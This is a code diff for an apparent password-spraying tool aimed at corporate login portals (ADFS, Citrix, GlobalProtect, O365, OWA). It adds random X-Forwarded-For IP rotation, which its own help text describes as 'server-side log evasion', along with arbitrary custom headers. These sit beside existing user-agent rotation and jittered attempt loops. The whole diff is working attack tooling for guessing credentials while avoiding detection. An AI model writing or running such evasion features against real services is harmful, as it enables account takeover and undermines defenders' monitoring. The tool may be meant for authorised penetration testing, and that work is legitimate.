@@ -18,6 +18,32 @@ import requests
 
 from targets import adfs, citrix, globalprotect, o365, owa
 
+def _random_public_ipv4() -> str:
+    """
+    Generate a random public-ish IPv4 string for X-Forwarded-For rotation.
+
+    Avoids RFC1918 ranges, loopback, multicast, and the canonical reserved
+    blocks. Targets often allow internal IPs through additional filters, so we
+    deliberately stay public-routable.
+    """
+    while True:
+        a = random.randint(1, 223)
+        b = random.randint(0, 255)
+        c = random.randint(0, 255)
+        d = random.randint(1, 254)
+        if a in (10, 127):
+            continue
+        if a == 172 and 16 <= b <= 31:
+            continue
+        if a == 192 and b == 168:
+            continue
+        if a == 169 and b == 254:
+            continue
+        if a >= 224:  # multicast / reserved
+            continue
+        return f"{a}.{b}.{c}.{d}"
+
+
 # Built-in user-agent pool for rotation (real browsers, recent versions).
 _DEFAULT_UA_POOL = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -201,6 +227,18 @@ def main() -> None:
         default=0,
         help="Hard cap on total attempts in this run (0 = unlimited). Useful for time-boxed engagements.",
     )
+    parser.add_argument(
+        "--xff-rotate",
+        action="store_true",
+        help="Add a random public IPv4 X-Forwarded-For header on every request (server-side log evasion).",
+    )
+    parser.add_argument(
+        "--header",
+        action="append",
+        default=[],
+        metavar="KEY:VALUE",
+        help="Custom header to send on every request. Repeatable. Example: --header 'X-Forwarded-Host: legit.com'.",
+    )
     args = parser.parse_args()
 
     if not args.password and not args.passlist:
@@ -278,7 +316,15 @@ def main() -> None:
             sleep_time = args.delay + random.uniform(0, args.jitter)
             time.sleep(sleep_time)
 
-            headers = {"User-Agent": random.choice(ua_pool)} if ua_pool else None
+            headers: dict = {"User-Agent": random.choice(ua_pool)} if ua_pool else {}
+            if args.xff_rotate:
+                headers["X-Forwarded-For"] = _random_public_ipv4()
+            for h in args.header:
+                if ":" in h:
+                    k, v = h.split(":", 1)
+                    headers[k.strip()] = v.strip()
+            if not headers:
+                headers = None
 
             if args.target == "o365":
                 result = o365.attempt(username, password, proxies=proxies)
